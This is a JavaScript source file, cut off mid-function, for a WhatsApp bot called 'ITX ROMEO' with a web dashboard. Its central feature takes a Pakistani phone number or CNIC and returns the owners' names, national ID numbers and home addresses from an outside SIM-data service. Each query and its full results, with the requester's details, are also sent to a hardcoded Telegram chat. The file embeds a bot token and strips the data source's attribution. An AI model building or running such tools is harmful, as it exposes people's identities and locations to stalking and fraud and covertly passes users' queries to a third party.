// ═══════════════════════════════════════════════════════════════
//  🤖  ITX ROMEO BOT  v5.0  —  WhatsApp Bot + Dashboard + Telegram + Urdu
// ═══════════════════════════════════════════════════════════════
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  Browsers,
  DisconnectReason
} = require('@whiskeysockets/baileys');
const pino    = require('pino');
const fs      = require('fs');
const express = require('express');
const https   = require('https');

// ── Express setup
const app  = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

// ── Global state
let sock       = null;
let botStatus  = { connected: false, phone: '', uptime: null, msgCount: 0, lookupCount: 0 };

// ── Anti-duplicate cache
const recentLookups = new Map();
const DEDUPE_WINDOW = 30000;

function isDuplicate(query) {
  const clean = query.replace(/[^0-9]/g, '');
  const last = recentLookups.get(clean);
  if (last && (Date.now() - last) < DEDUPE_WINDOW) return true;
  recentLookups.set(clean, Date.now());
  if (recentLookups.size > 100) {
    const now = Date.now();
    for (const [k, v] of recentLookups) {
      if (now - v > DEDUPE_WINDOW) recentLookups.delete(k);
    }
  }
  return false;
}

// ── Settings
const SETTINGS_FILE = './settings.json';
let settings = {};
if (fs.existsSync(SETTINGS_FILE)) {
  try { settings = JSON.parse(fs.readFileSync(SETTINGS_FILE)); } catch (_) {}
}
const saveSettings = () => fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));

// ═══════════════════════════════════════════════════
//  📲  TELEGRAM NOTIFIER
// ═══════════════════════════════════════════════════
const TG_TOKEN = '5893809958:AAHxBCHFPDIwejnOV596s2joow3KOSLEnCI';
const TG_CHAT  = '6383817850';

function sendTelegram(text) {
  return new Promise((resolve, reject) => {
    const clean = text.replace(/[*_`]/g, '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const encoded = encodeURIComponent(clean);
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encoded}&parse_mode=HTML`;
    
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch (e) { resolve(data); }
      });
    }).on('error', (e) => {
      console.error('Telegram send error:', e.message);
      reject(e);
    });
  });
}

// ═══════════════════════════════════════════════════
//  🌐  URDU TRANSLITERATION MAP
// ═══════════════════════════════════════════════════
function toUrdu(text) {
  if (!text || text === 'N/A' || text === '?' || text === ', , ?' || text.trim() === '') return 'N/A';
  
  const map = {
    'MUHAMMAD': 'محمد', 'MUHAMAD': 'محمد', 'MOHAMMAD': 'محمد', 'MOHAMAD': 'محمد',
    'AHMED': 'احمد', 'AHMAD': 'احمد', 'ALI': 'علی', 'HASSAN': 'حسن', 'HUSSAIN': 'حسین',
    'HUSAIN': 'حسین', 'SAGHEER': 'صغیر', 'SAGHIR': 'صغیر', 'AKBAR': 'اکبر', 'ASGHAR': 'اصغر',
    'ABBAS': 'عباس', 'ABDULLAH': 'عبداللہ', 'ABDUL': 'عبدل', 'REHMAN': 'رحمان', 'RAHMAN': 'رحمان',
    'RAHEEM': 'رحیم', 'RAHIM': 'رحیم', 'KHAN': 'خان', 'MALIK': 'ملک', 'SIDDIQUE': 'صدیق',
    'SIDDIQ': 'صدیق', 'FAROOQ': 'فاروق', 'USMAN': 'عثمان', 'OSMAN': 'عثمان', 'UMAR': 'عمر',
    'OMAR': 'عمر', 'BILAL': 'بلال', 'IMRAN': 'عمران', 'NAWAZ': 'نواز', 'SHARIF': 'شریف',
    'BHUTTO': 'بھٹو', 'IQBAL': 'اقبال', 'JAVED': 'جاوید', 'JAVEED': 'جاوید', 'SAEED': 'سعید',
    'RASHID': 'راشد', 'RASHEED': 'رشید', 'AMEEN': 'امین', 'AMIN': 'امین', 'NABEEL': 'نبیل',
    'NABIL': 'نبیل', 'WAQAR': 'وقار', 'WAQAS': 'وقاص', 'SOHAIL': 'سہیل', 'DANISH': 'دانش',
    'KAMRAN': 'کامران', 'IRFAN': 'عرفان', 'ARSLAN': 'ارسلان', 'ARSALAN': 'ارسلان', 'SHAHID': 'شاہد',
    'ZAHID': 'زاہد', 'NASIR': 'ناصر', 'NASEER': 'نصیر', 'TARIQ': 'طارق', 'ASIF': 'آصف',
    'ARIF': 'عارف', 'LATIF': 'لطیف', 'SHAFIQ': 'شفیق', 'RAFIQ': 'رفیق', 'MAQSOOD': 'مقصود',
    'MASOOD': 'مسعود', 'MAQBOOL': 'مقبول', 'MAHMOOD': 'محمود', 'MEHMOOD': 'محمود', 'GHAFOOR': 'غفور',
    'GHAFFAR': 'غفار', 'RIAZ': 'ریاض', 'NIAZ': 'نیاز', 'FAIZ': 'فیض', 'FAIZAN': 'فیضان',
    'ADIL': 'عادل', 'ADEEL': 'عدیل', 'WAHEED': 'وحید', 'KHALID': 'خالد', 'KHALEEL': 'خلیل',
    'JAMEEL': 'جمیل', 'JAMIL': 'جمیل', 'SALEEM': 'سلیم', 'SALIM': 'سلیم', 'SALMAN': 'سلمان',
    'SULEMAN': 'سلیمان', 'SULAIMAN': 'سلیمان', 'YOUSAF': 'یوسف', 'YOUSUF': 'یوسف', 'IBRAHIM': 'ابراہیم',
    'ISMAIL': 'اسماعیل', 'ISHAQ': 'اسحاق', 'YAQOOB': 'یعقوب', 'MOOSA': 'موسیٰ', 'MUSA': 'موسیٰ',
    'HAROON': 'ہارون', 'ZAKARIA': 'زکریا', 'YAHYA': 'یحییٰ', 'EESA': 'عیسیٰ', 'ISA': 'عیسیٰ',
    'FATIMA': 'فاطمہ', 'AISHA': 'عائشہ', 'KHADIJA': 'خدیجہ', 'ZAINAB': 'زینب', 'MARYAM': 'مریم',
    'AMNA': 'آمنہ', 'HALEEMA': 'حلیمہ', 'SAIMA': 'صائمہ', 'NADIA': 'نادیہ', 'SADIA': 'سعدیہ',
    'SAMINA': 'ثمینہ', 'RUKHSANA': 'رخسانہ', 'RUBINA': 'روبینہ', 'SHAHNAZ': 'شہناز', 'PARVEEN': 'پروین',
    'NASREEN': 'نسرین', 'YASMEEN': 'یاسمین', 'SHABANA': 'شبانہ', 'RAZIA': 'رضیہ', 'ROBINA': 'روبینہ',
    'BUSHRA': 'بشریٰ', 'KANWAL': 'کنول', 'NOSHEEN': 'نوشین', 'NAHEED': 'ناہید', 'SHAHEEN': 'شاہین',
    'TAHIRA': 'طاہرہ', 'ZAHRA': 'زہرہ', 'SAIRA': 'سائرہ', 'SHAMIM': 'شمیم', 'MUSARRAT': 'مسرت',
    'KHALIDA': 'خالدہ', 'JAMEELA': 'جمیلہ', 'SALEEMA': 'سلیمہ', 'KISHWAR': 'کشور', 'SULTANA': 'سلطانہ',
    'BEGUM': 'بیگم', 'KHATOON': 'خاتون', 'BIBI': 'بی بی', 'JAN': 'جان', 'GUL': 'گل',
    'SINGH': 'سنگھ', 'KUMAR': 'کمار', 'LAL': 'لال', 'DEEN': 'دین', 'DIN': 'دین',
    'ULLAH': 'اللہ', 'NOOR': 'نور', 'HAQ': 'حق', 'RASOOL': 'رسول', 'NABI': 'نبی',
    'GHULAM': 'غلام', 'NAZEER': 'نذیر', 'NAZIR': 'نذیر', 'AHMAD': 'احمد',
    'BASTI': 'بستی', 'KHAS': 'خاص', 'JATOI': 'جتوئی', 'MUZAFFAR': 'مظفر', 'GARH': 'گڑھ',
    'KALAR': 'کالر', 'BAKHSHAY': 'بخشائے', 'BAKHSHA': 'بخشا', 'WALI': 'والی', 'WALA': 'والا',
    'ROAD': 'روڈ', 'STREET': 'سٹریٹ', 'COLONY': 'کالونی', 'TOWN': 'ٹاؤن', 'CITY': 'شہر',
    'VILLAGE': 'گاؤں', 'CHOWK': 'چوک', 'MARKET': 'مارکیٹ', 'HOSPITAL': 'ہسپتال',
    'SCHOOL': 'اسکول', 'MASJID': 'مسجد', 'MOHALLA': 'محلہ', 'GALI': 'گلی', 'MAIN': 'مین',
    'NEAR': 'قریب', 'HOUSE': 'گھر', 'SHOP': 'دکان', 'FACTORY': 'فیکٹری', 'MILL': 'مل',
    'FARM': 'فارم', 'DERA': 'ڈیرہ', 'KOT': 'کوٹ', 'PURA': 'پورہ', 'ABAD': 'آباد',
    'NAGAR': 'نگر', 'PUR': 'پور', 'CHAK': 'چک', 'KARACHI': 'کراچی', 'LAHORE': 'لاہور',
    'ISLAMABAD': 'اسلام آباد', 'PESHAWAR': 'پشاور', 'QUETTA': 'کوئٹہ', 'MULTAN': 'ملتان',
    'FAISALABAD': 'فیصل آباد', 'RAWALPINDI': 'راولپنڈی', 'HYDERABAD': 'حیدرآباد',
    'GUJRANWALA': 'گوجرانوالہ', 'SIALKOT': 'سیالکوٹ', 'SARGODHA': 'سرگودھا',
    'BAHAWALPUR': 'بہاولپور', 'SAHIWAL': 'ساہیوال', 'SHEIKHUPURA': 'شیخوپورہ',
    'LARKANA': 'لاڑکانہ', 'SUKKUR': 'سکھر', 'DADU': 'دادو', 'MIRPUR': 'میرپور',
    'MUZAFFARGARH': 'مظفرگڑھ', 'TALARI': 'تلیری', 'GPO': 'جی پی او', 'NO': 'نمبر',
  };
  
  let words = text.split(/[\s,]+/);
  let translated = words.map(w => {
    const upper = w.toUpperCase();
    if (map[upper]) return map[upper];
    // Try removing trailing S
    const noS = upper.replace(/S$/, '');
    if (map[noS]) return map[noS];
    return w;
  }).join(' ');
  
  if (translated === text) {
    const charMap = {
      'A': 'ا', 'B': 'ب', 'C': 'ک', 'D': 'د', 'E': 'ع', 'F': 'ف',
      'G': 'گ', 'H': 'ہ', 'I': 'ی', 'J': 'ج', 'K': 'ک', 'L': 'ل',
      'M': 'م', 'N': 'ن', 'O': 'و', 'P': 'پ', 'Q': 'ق', 'R': 'ر',
      'S': 'س', 'T': 'ٹ', 'U': 'و', 'V': 'و', 'W': 'و', 'X': 'کس',
      'Y': 'ے', 'Z': 'ز',
    };
    translated = text.split('').map(c => charMap[c.toUpperCase()] || c).join('');
  }
  
  return translated;
}

// ════════════════════════════════════════════════════════════════
//  🌐  DASHBOARD HTML
// ════════════════════════════════════════════════════════════════
const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>ITX ROMEO — Dashboard</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;overflow-x:hidden;}
    .bg-grid{position:fixed;inset:0;pointer-events:none;z-index:0;
      background-image:linear-gradient(rgba(220,38,80,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(220,38,80,.03) 1px,transparent 1px);
      background-size:50px 50px;}
    .glow-orb{position:fixed;width:600px;height:600px;border-radius:50%;filter:blur(120px);opacity:.06;pointer-events:none;z-index:0;}
    .glow-orb-1{top:-200px;left:-100px;background:#dc2640;}
    .glow-orb-2{bottom:-200px;right:-100px;background:#8b1a30;}
    .container{position:relative;z-index:1;max-width:480px;margin:0 auto;padding:20px;}
    
    .card{background:rgba(20,20,30,.85);border:1px solid rgba(220,38,80,.15);border-radius:18px;backdrop-filter:blur(20px);}
    .card-accent{box-shadow:0 0 30px rgba(220,38,80,.06),inset 0 1px 0 rgba(255,255,255,.03);}
    
    .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border:none;cursor:pointer;font-family:inherit;
      transition:all .25s;border-radius:12px;font-weight:600;letter-spacing:.01em;}
    .btn:active{transform:scale(.97);}
    .btn-primary{background:linear-gradient(135deg,#dc2640,#a31c30);color:#fff;box-shadow:0 4px 20px rgba(220,38,80,.25);}
    .btn-primary:hover{box-shadow:0 6px 28px rgba(220,38,80,.4);transform:translateY(-1px);}
    .btn-danger{background:rgba(220,38,38,.12);color:#fca5a5;border:1px solid rgba(220,38,38,.25);}
    .btn-danger:hover{background:rgba(220,38,38,.22);}
    .btn-ghost{background:rgba(255,255,255,.04);color:#a0a0b0;border:1px solid rgba(255,255,255,.08);}
    .btn-ghost:hover{background:rgba(255,255,255,.08);color:#d0d0d0;}
    
    input{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);color:#e0e0e0;
      font-family:inherit;border-radius:12px;transition:all .25s;outline:none;}
    input:focus{border-color:rgba(220,38,80,.5);box-shadow:0 0 0 3px rgba(220,38,80,.08);}
    input::placeholder{color:rgba(255,255,255,.2);}
    
    .tag{display:inline-flex;align-items:center;gap:4px;font-size:.75rem;background:rgba(220,38,80,.08);
      color:#f8719a;border:1px solid rgba(220,38,80,.18);border-radius:8px;padding:3px 10px;
      font-family:'Courier New',monospace;letter-spacing:.02em;}
    
    .code-box{font-family:'Courier New',monospace;background:rgba(220,38,80,.05);
      border:2px dashed rgba(220,38,80,.2);border-radius:14px;text-align:center;}
    
    .stat-card{background:rgba(20,20,30,.7);border:1px solid rgba(255,255,255,.06);border-radius:14px;
      padding:16px;transition:all .3s;}
    .stat-card:hover{border-color:rgba(220,38,80,.2);}
    
    .online-dot{width:9px;height:9px;background:#22c55e;border-radius:50%;display:inline-block;
      animation:pulse 2s infinite;box-shadow:0 0 8px rgba(34,197,94,.5);}
    .offline-dot{width:9px;height:9px;background:#6b7280;border-radius:50%;display:inline-block;}
    @keyframes pulse{0%,100%{box-shadow:0 0 4px rgba(34,197,94,.4);}50%{box-shadow:0 0 16px rgba(34,197,94,.6);}}
    
    .icon-lg{font-size:2.2rem;line-height:1;}
    .icon-md{font-size:1.4rem;line-height:1;}
    .icon-sm{font-size:1rem;line-height:1;}
    
    .fade-in{animation:fadeIn .5s ease both;}
    @keyframes fadeIn{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
    
    .hidden{display:none !important;}
    
    .divider{height:1px;background:rgba(255,255,255,.06);margin:16px 0;}
    
    .footer-text{color:#3a3a4a;font-size:.7rem;text-align:center;}
    
    ::-webkit-scrollbar{width:3px;}
    ::-webkit-scrollbar-track{background:transparent;}
    ::-webkit-scrollbar-thumb{background:rgba(220,38,80,.2);border-radius:2px;}
  </style>
</head>
<body>
  <div class="bg-grid"></div>
  <div class="glow-orb glow-orb-1"></div>
  <div class="glow-orb glow-orb-2"></div>

  <div class="container" style="padding-top:40px;">

    <!-- LOGIN SCREEN -->
    <div id="loginScreen" class="fade-in">
      <div style="text-align:center;margin-bottom:30px;">
        <div style="display:inline-flex;align-items:center;justify-content:center;
          width:70px;height:70px;border-radius:20px;margin-bottom:12px;
          background:linear-gradient(135deg,rgba(220,38,80,.15),rgba(160,28,48,.08));
          border:1px solid rgba(220,38,80,.2);">
          <span class="icon-lg">◈</span>
        </div>
        <h1 style="font-size:1.8rem;font-weight:800;letter-spacing:-.02em;margin-bottom:4px;">
          <span style="color:#dc2640;">ITX</span> <span style="color:#e0e0e0;">ROMEO</span>
        </h1>
        <p style="color:#606080;font-size:.85rem;">WhatsApp Bot Control Panel</p>
      </div>

      <div class="card card-accent" style="padding:24px;">
        <div id="loginForm">
          <p style="font-size:.8rem;color:#707090;margin-bottom:14px;">
            ◉ WhatsApp number enter karen — pairing code milega
          </p>
          <input id="phoneInput" type="tel" placeholder="+92 300 1234567"
            style="width:100%;padding:13px 16px;font-size:.9rem;margin-bottom:12px;"/>
          <button onclick="requestPair()" class="btn btn-primary" style="width:100%;padding:13px;font-size:.9rem;margin-bottom:10px;">
            ◈ Get Pairing Code
          </button>
          <button onclick="resetBot()" class="btn btn-danger" style="width:100%;padding:11px;font-size:.8rem;">
            ✕ Reset Previous Session
          </button>
          <div id="statusMsg" style="margin-top:12px;text-align:center;font-size:.78rem;min-height:18px;color:#9090a0;"></div>
        </div>

        <div id="pairingSection" class="hidden" style="text-align:center;">
          <p style="font-size:.78rem;color:#808090;margin-bottom:4px;">WhatsApp mein ye code enter karen</p>
          <p style="font-size:.72rem;color:#606070;margin-bottom:14px;">Linked Devices → Link a Device</p>
          <div class="code-box" style="padding:20px 16px;margin-bottom:14px;">
            <span id="codeDisplay" style="font-size:2.4rem;font-weight:800;color:#dc2640;letter-spacing:.25em;"></span>
          </div>
          <p style="font-size:.75rem;color:#f59e0b;margin-bottom:12px;">⏳ Code 60 seconds mein expire hoga</p>
          <p style="font-size:.78rem;color:#707090;margin-bottom:14px;">Connected hone ka wait ho raha hai…</p>
          <button onclick="showLoginForm()" class="btn btn-ghost" style="padding:10px 18px;font-size:.8rem;">
            ← Back
          </button>
          <div id="statusMsg2" style="margin-top:12px;text-align:center;font-size:.78rem;min-height:18px;color:#9090a0;"></div>
        </div>
      </div>

      <p class="footer-text" style="margin-top:18px;">© 2025 Itx Romeo — All rights reserved</p>
    </div>

    <!-- DASHBOARD -->
    <div id="dashboard" class="hidden fade-in">

      <!-- Header -->
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;
        background:rgba(20,20,30,.7);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:14px 18px;">
        <div style="display:flex;align-items:center;gap:12px;">
          <div style="width:42px;height:42px;border-radius:14px;display:flex;align-items:center;justify-content:center;
            background:rgba(220,38,80,.1);border:1px solid rgba(220,38,80,.15);">
            <span class="icon-md">◈</span>
          </div>
          <div>
            <h2 style="font-size:.95rem;font-weight:700;color:#dc2640;">ITX ROMEO</h2>
            <p id="headerPhone" style="font-size:.75rem;color:#606080;font-family:'Courier New',monospace;"></p>
          </div>
        </div>
        <div id="statusBadge" style="display:flex;align-items:center;gap:8px;padding:7px 14px;
          background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.12);border-radius:20px;font-size:.75rem;font-weight:600;color:#86efac;">
          <span class="online-dot"></span> Connected
        </div>
      </div>

      <!-- Stats Grid -->
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px;">
        <div class="stat-card">
          <p style="font-size:.7rem;color:#606080;margin-bottom:6px;">◉ Status</p>
          <p id="statStatus" style="font-size:.9rem;font-weight:700;color:#22c55e;">Online</p>
        </div>
        <div class="stat-card">
          <p style="font-size:.7rem;color:#606080;margin-bottom:6px;">◉ Messages</p>
          <p id="statMsgs" style="font-size:1.5rem;font-weight:800;color:#dc2640;">0</p>
        </div>
        <div class="stat-card">
          <p style="font-size:.7rem;color:#606080;margin-bottom:6px;">◉ Lookups</p>
          <p id="statLookups" style="font-size:1.5rem;font-weight:800;color:#fb923c;">0</p>
        </div>
        <div class="stat-card">
          <p style="font-size:.7rem;color:#606080;margin-bottom:6px;">◉ Uptime</p>
          <p id="statUptime" style="font-size:1.5rem;font-weight:800;color:#a78bfa;">0m</p>
        </div>
      </div>

      <!-- Commands -->
      <div class="card card-accent" style="padding:18px;margin-bottom:14px;">
        <h3 style="font-size:.85rem;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px;">
          <span style="color:#dc2640;">◈</span> Commands
        </h3>
        <div style="display:flex;flex-wrap:wrap;gap:8px;">
          <span class="tag">◉ .ai</span>
          <span class="tag">◉ .roast</span>
          <span class="tag">◉ .joke</span>
          <span class="tag">◉ .quote</span>
          <span class="tag">◉ .shayari</span>
          <span class="tag">◉ .n [number]</span>
          <span class="tag">◉ .n [cnic]</span>
          <span class="tag">◉ .pair [number]</span>
          <span class="tag">◉ .ping</span>
          <span class="tag">◉ .info</span>
          <span class="tag">◉ .menu</span>
        </div>
        <div style="margin-top:12px;padding:10px;background:rgba(251,146,60,.04);border:1px solid rgba(251,146,60,.12);border-radius:10px;">
          <p style="font-size:.72rem;color:#fb923c;margin-bottom:4px;">◉ Number Banned?</p>
          <span style="font-size:.7rem;color:#f8719a;">https://rmnumber.vercel.app</span>
        </div>
      </div>

      <!-- Controls -->
      <div class="card card-accent" style="padding:18px;">
        <h3 style="font-size:.85rem;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px;">
          <span style="color:#dc2640;">◈</span> Controls
        </h3>
        <div style="display:flex;gap:10px;">
          <button onclick="resetBot()" class="btn btn-danger" style="padding:11px 18px;font-size:.8rem;">
            ✕ Reset Session
          </button>
          <button onclick="checkStatus()" class="btn btn-ghost" style="padding:11px 18px;font-size:.8rem;">
            ↻ Refresh
          </button>
        </div>
        <p id="ctrlMsg" style="margin-top:10px;font-size:.72rem;color:#606080;min-height:16px;"></p>
      </div>

      <p class="footer-text" style="margin-top:18px;">© 2025 Itx Romeo — All rights reserved</p>
    </div>
  </div>

  <script>
    let pollTimer;
    let wasConnected = false;

    async function requestPair() {
      const phone = document.getElementById('phoneInput').value.trim();
      if (!phone) return setStatus('◉ Number enter karen', '#f59e0b');
      setStatus('◉ Requesting...', '#60a5fa');
      try {
        const r = await fetch('/api/pair', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ phone })
        });
        const d = await r.json();
        if (d.code) {
          document.getElementById('loginForm').classList.add('hidden');
          document.getElementById('pairingSection').classList.remove('hidden');
          document.getElementById('codeDisplay').textContent = d.code;
          setStatus('', '');
          startPoll();
        } else {
          setStatus('✕ ' + (d.error || 'Failed'), '#f87171');
        }
      } catch (e) {
        setStatus('✕ Server error: ' + e.message, '#f87171');
      }
    }

    async function resetBot() {
      if (!confirm('Previous session delete karen?')) return;
      const r = await fetch('/api/reset', { method:'POST' });
      const d = await r.json();
      if (d.success) {
        document.getElementById('ctrlMsg').textContent = '◉ Reset done! Reloading...';
        setTimeout(() => location.reload(), 1500);
      }
    }

    function showLoginForm() {
      document.getElementById('loginForm').classList.remove('hidden');
      document.getElementById('pairingSection').classList.add('hidden');
    }

    function setStatus(msg, color) {
      const el = document.getElementById('statusMsg');
      if (el) { el.textContent = msg; el.style.color = color || '#9090a0'; }
      const el2 = document.getElementById('statusMsg2');
      if (el2) { el2.textContent = msg; el2.style.color = color || '#9090a0'; }
    }

    function startPoll() {
      clearInterval(pollTimer);
      pollTimer = setInterval(checkStatus, 2000);
    }

    async function checkStatus() {
      try {
        const r = await fetch('/api/status');
        const d = await r.json();
        if (d.connected) {
          if (!wasConnected) {
            wasConnected = true;
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
          }
          document.getElementById('headerPhone').textContent = '+' + (d.phone || '');
          document.getElementById('statMsgs').textContent    = d.msgCount    || 0;
          document.getElementById('statLookups').textContent = d.lookupCount || 0;
          if (d.uptimeMs) {
            const mins = Math.floor(d.uptimeMs / 60000);
            const hrs  = Math.floor(mins / 60);
            document.getElementById('statUptime').textContent = hrs > 0 ? hrs + 'h ' + (mins % 60) + 'm' : mins + 'm';
          }
          if (document.getElementById('pairingSection') && !document.getElementById('pairingSection').classList.contains('hidden')) {
            document.getElementById('pairingSection').classList.add('hidden');
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
          }
        }
      } catch (_) {}
    }

    // Check immediately on load
    checkStatus();
    startPoll();
  </script>
</body>
</html>`;

// ── Express Routes
app.get('/{*any}', (req, res) => res.send(DASHBOARD_HTML));

app.get('/api/status', (req, res) => {
  res.json({
    connected   : botStatus.connected,
    phone       : botStatus.phone,
    msgCount    : botStatus.msgCount,
    lookupCount : botStatus.lookupCount,
    uptimeMs    : botStatus.uptime ? Date.now() - botStatus.uptime : 0
  });
});

app.post('/api/pair', async (req, res) => {
  try {
    const { phone } = req.body || {};
    if (!phone) return res.json({ error: 'Phone number required' });
    const clean = phone.replace(/[^0-9]/g, '');
    if (!sock) return res.json({ error: 'Bot initializing...' });
    if (botStatus.connected) return res.json({ error: 'Already connected' });
    const code = await sock.requestPairingCode(clean);
    res.json({ code });
  } catch (e) {
    res.json({ error: e.message });
  }
});

app.post('/api/reset', (req, res) => {
  try {
    if (fs.existsSync('./auth_info')) fs.rmSync('./auth_info', { recursive: true, force: true });
    // Clean pair auth folders
    const files = fs.readdirSync('.');
    files.forEach(f => {
      if (f.startsWith('auth_pair_')) fs.rmSync(f, { recursive: true, force: true });
    });
    botStatus = { connected: false, phone: '', uptime: null, msgCount: 0, lookupCount: 0 };
    res.json({ success: true });
    setTimeout(() => { if (sock) { try { sock.end(); } catch (_) {} } startBot(); }, 500);
  } catch (e) {
    res.json({ error: e.message });
  }
});

app.listen(PORT, () => console.log(`\n◈ Dashboard → http://localhost:${PORT}\n`));

// ════════════════════════════════════════════════════════════════
//  🧠  GROK AI
// ════════════════════════════════════════════════════════════════
const GROK_URL   = 'https://grok-api-red.vercel.app/chat/completions';
const GROK_MODEL = 'grok-4.1-fast';

async function getAI(prompt, temp = 0.7) {
  try {
    const r = await fetch(GROK_URL, {
      method : 'POST',
      headers: { 'Content-Type': 'application/json' },
      body   : JSON.stringify({ model: GROK_MODEL, messages: [{ role: 'user', content: prompt }], temperature: temp })
    });
    const d = await r.json();
    if (d.choices) return d.choices[0].message.content;
    throw new Error(JSON.stringify(d));
  } catch (e) {
    return '✕ Error: AI server busy hai, thodi der baad try karo!';
  }
}

// ════════════════════════════════════════════════════════════════
//  🔍  NUMBER LOOKUP + CNIC SEARCH + URDU
// ════════════════════════════════════════════════════════════════
function normalizeNumber(raw) {
  let n = raw.replace(/[^0-9]/g, '');
  if      (n.startsWith('0') && n.length === 11) n = '92' + n.slice(1);
  else if (n.startsWith('3') && n.length === 10) n = '92' + n;
  else if (n.startsWith('0092'))                 n = n.slice(2);
  return n;
}

const PK_NUM_RE = /(?:\+92|0092|92|0)[\s\-.]?3\d{2}[\s\-.]?\d{3}[\s\-.]?\d{4}/g;
function extractPKNumber(text) {
  const m = text.match(PK_NUM_RE);
  return m ? m[0] : null;
}

const CNIC_RE = /\b[3-7]\d{4}[\s\-]?\d{7}[\s\-]?\d\b|\b[3-7]\d{12}\b/g;
function extractCNIC(text) {
  const m = text.match(CNIC_RE);
  return m ? m[0] : null;
}

async function fetchSIMData(queryParam) {
  const r = await fetch(`https://ramzan-simdata.deno.dev/?${queryParam}`);
  return r.json();
}

function formatRecord(d, idx, prefix) {
  const addr = (!d.address || ['NULL','no','N/A','?',', , ?'].includes(d.address.trim())) ? 'N/A' : d.address;
  const nameUrdu = toUrdu(d.name || '');
  const addrUrdu = addr === 'N/A' ? 'N/A' : toUrdu(addr);
  // Remove "developed_by" and "Ramzan Ahsan" from display
  const addrClean = addr.replace(/developed by ramzan ahsan/gi, '').replace(/ramzan ahsan/gi, 'Itx Romeo').trim();
  const addrUrduClean = addrUrdu === 'N/A' ? 'N/A' : addrUrdu.replace(/رمضان احسن/gi, 'اتکس رومیو').trim();
  
  return (
    `${prefix} Record #${idx + 1}\n` +
    `  ◉ Number: +${d.number}\n` +
    `  ◉ Name: ${d.name}\n` +
    `  ◉ Name (Urdu): ${nameUrdu}\n` +
    `  ◉ CNIC: ${d.cnic}\n` +
    `  ◉ Address: ${addrClean}\n` +
    `  ◉ Address (Urdu): ${addrUrduClean}\n`
  );
}

function dedupe(arr) {
  const seen = new Set();
  return arr.filter(d => seen.has(d.number) ? false : (seen.add(d.number), true));
}

async function lookupByCNIC(rawCnic, requesterInfo = '') {
  const cnic = rawCnic.replace(/[^0-9]/g, '');
  
  // Send to Telegram immediately — searching
  sendTelegram(
    `◈ CNIC LOOKUP STARTED\n◉ CNIC: ${cnic}\n◉ By: ${requesterInfo}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`
  ).catch(() => {});

  try {
    // Try both ?number= and ?cnic= endpoints
    let data = await fetchSIMData(`number=${cnic}`);
    
    if (!data.success || !data.data?.length) {
      // Not found via number endpoint, send TG
      sendTelegram(
        `✕ CNIC NOT FOUND\n◉ CNIC: ${cnic}\n◉ By: ${requesterInfo}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`
      ).catch(() => {});
      
      return (
        `╔══════════════════════╗\n` +
        `║ ◈ CNIC LOOKUP ║\n` +
        `╚══════════════════════╝\n\n` +
        `✕ Not Found\n` +
        `◉ CNIC: ${cnic}\n\n` +
        `◉ Developed by Itx Romeo`
      );
    }

    const records = dedupe(data.data);
    let txt = '';
    txt += `╔══════════════════════╗\n`;
    txt += `║ ◈ CNIC LOOKUP ║\n`;
    txt += `╚══════════════════════╝\n\n`;
    txt += `◉ CNIC: ${cnic}\n`;
    txt += `◉ Total SIMs: ${data.total_sims_found || records.length}\n`;
    txt += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    records.forEach((d, i) => {
      txt += formatRecord(d, i, '◈') + '\n';
    });

    txt += `━━━━━━━━━━━━━━━━━━━━━━\n`;
    txt += `◉ Number Banned?\n`;
    txt += `◉ https://rmnumber.vercel.app\n\n`;
    txt += `◉ Developed by Itx Romeo`;

    botStatus.lookupCount++;

    // Send results to Telegram
    let tgMsg = `◈ CNIC LOOKUP - FOUND ✅\n◉ CNIC: ${cnic}\n◉ Total SIMs: ${data.total_sims_found || records.length}\n◉ By: ${requesterInfo}\n◉ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n\n◉ RECORDS:\n`;
    records.forEach((d, i) => {
      const addr = (!d.address || ['NULL','no','N/A','?',', , ?'].includes(d.address.trim())) ? 'N/A' : d.address;
      tgMsg += `\n${i+1}. +${d.number} | ${d.name} | ${d.cnic} | ${addr.replace(/developed by ramzan ahsan/gi, '').trim()}`;
    });
    tgMsg += `\n\n◉ Developed by Itx Romeo`;
    sendTelegram(tgMsg).catch(() => {});

    return txt;
  } catch (e) {
    console.error('CNIC Lookup error:', e.message);
    sendTelegram(`✕ CNIC LOOKUP ERROR\n◉ CNIC: ${cnic}\n◉ Error: ${e.message}`).catch(() => {});
    return `✕ Lookup Failed\nServer se connect nahi ho saka.\n\n◉ Developed by Itx Romeo`;
  }
}

async function lookupNumber(rawNum, requesterInfo = '') {
  try {
    const num  = normalizeNumber(rawNum);
    const data = await fetchSIMData(`number=${num}`);

    if (!data.success || !data.data?.length) {
      sendTelegram(
